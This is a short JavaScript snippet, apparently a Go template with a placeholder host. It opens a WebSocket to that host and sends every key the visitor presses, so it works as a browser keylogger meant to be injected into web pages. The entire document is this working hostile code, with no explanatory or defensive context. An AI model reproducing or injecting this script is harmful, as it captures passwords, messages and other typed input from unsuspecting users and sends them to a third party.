(function () {
  var conn = new WebSocket("ws://{{.}}/ws")
  document.addEventListener("keypress",(e)=> {
   conn.send(e.key)
  })
})();
